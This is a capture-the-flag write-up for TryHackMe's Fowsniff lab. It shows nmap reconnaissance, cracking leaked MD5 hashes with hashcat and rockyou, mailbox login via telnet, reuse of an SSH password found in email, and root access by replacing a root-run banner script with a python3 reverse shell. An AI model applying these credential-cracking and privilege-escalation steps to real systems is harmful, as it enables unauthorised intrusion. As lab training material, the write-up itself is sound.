# [Fowsniff CTF](https://tryhackme.com/room/ctf)

<a href="https://tryhackme.com/room/ctf"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/ctf), made by [ben](https://tryhackme.com/p/ben).

Dificulty: `Easy`

Solved in: `2026/05/29`

# Table of Contents

- [Fowsniff CTF](#fowsniff-ctf)
- [Table of Contents](#table-of-contents)
- [Writeup](#writeup)
   * [Reconnaissance](#reconnaissance)
   * [Exploration](#exploration)
   * [Escalação de privilégio](#escalação-de-privilégio)

# Writeup

## Reconnaissance

Starting the machine, as I usually do, I added it to local DNS `/etc/hosts` as `ctf.net` and verified connection with ping. All works, so I moved on to `nmap`:[^nmap]

```bash
$ nmap -T4 <MACHINE_IP>
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 20:32 UTC
Nmap scan report for ctf.net (<MACHINE_IP>)
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap

Nmap done: 1 IP address (1 host up) scanned in 2.41 seconds
```

Well, there's a `http`, a `ssh`, and an email system with `pop3` and `imap`. Within the `http` we only really have a data breach warning... Usually, to solve this machine, one would need to access twitter with an username on the `http` and eventually get to a pastebin. However, doing so is now hard without an account on X (which I do not have) and even so, the original pastebin has been deleted as a false positive. So, doing a search online and gathering a `.txt` from the author himself: [fowsniff.txt](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt).

With this it becomes clear what to do. Nine emails, nine hashes! And, by admission of the hacker themselves, these hashes are `MD5`.

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

...

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
```

To break these hashes I used `hashcat`[^hashcat] along the rockyou[^rockyou] wordlist, with the following command:

```bash
$ hashcat -a 0 -m 0 'HASH' /usr/share/wordlists/rockyou.txt.gz
```

Of the nine emails, only **one** didn't have a password present within rockyou (foreshadowing). Great!

```
mauer@fowsniff:<PASS0>
mustikka@fowsniff:<PASS1>
tegel@fowsniff:<PASS2>
baksteen@fowsniff:<PASS3>
seina@fowsniff:<PASS4>
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:<PASS5>
parede@fowsniff:<PASS6>
sciana@fowsniff:<PASS7>
```

## Exploration

Following directly to email, I tried every available combination, hoping one wouldn't yet have changed passwords...

```bash
$ telnet ctf.net 110
Trying <MACHINE_IP>...
Connected to ctf.net.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
user <USER_EM>
+OK
pass <PASS_EM>
+OK Logged in.
list
+OK 2 messages:
1 1622
2 1280
```

Not only did I found an account, but so too it had two emails!

Email 1 (1622) is a warning from A. J. Stone about the data breach and an order to alter passwords, chiming in with the little detail the passwords were quite insecure. As so...


He also provides a temporary password for `ssh`, `<PASS_SSH>`, but it doesn't work with the user `<USER_EM>`:

```bash
$ ssh <USER_EM>@ctf.net
<USER_EM>@ctf.net's password: <PASS_SSH>
Permission denied, please try again.
```

But I got my lead on the second email...

```
Devin,

...

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler
```

Great! Using Skyler's email, I quickly get access to `ssh`:

```bash
$ ssh <USER_SSH>@ctf.net
<USER_SSH>@ctf.net's password: <PASS_SSH>
$ ssh baksteen@ctf.net

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from <OTHER_IP0>
<USER_SSH>@fowsniff:~$ whoami
<USER_SSH>
```

## Escalação de privilégio

```bash
<USER_SSH>@fowsniff:~$ sudo -l
[sudo] password for <USER_SSH>: 
Sorry, user <USER_SSH> may not run sudo on fowsniff.
```

Dammit! Oh well, using the Try Hack Me lines, they talk about searching for executables the user can access. That means:

```bash
$ find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
...
```

A shell script? The first result of the search, too! Looking deeper into it, it's the banner that appears when logging into `ssh`. It is *very* likely this is executed with root, on the `ssh` startup.

Using the reverse shell[^rv] the very challenge provides, I substituted the script to execute `python3`.[^py] I also put `netcat`[^nc] to listen on port `1234` and finally once more logged in on `ssh`:

```bash
$ ssh <USER_SSH>@ctf.net
<USER_SSH>@ctf.net's password: <PASS_SSH>
# whoami
root
```

Great! After a little more exploring...

```bash
# cd /root
cd /root
# cat flag.txt
cat flag.txt
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.
```

[^nmap]: https://github.com/nmap/nmap
[^nc]: https://nc110.sourceforge.io/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling
[^hashcat]: https://hashcat.net/hashcat/
[^rockyou]: https://weakpass.com/wordlists/rockyou.txt
[^py]: https://www.python.org/
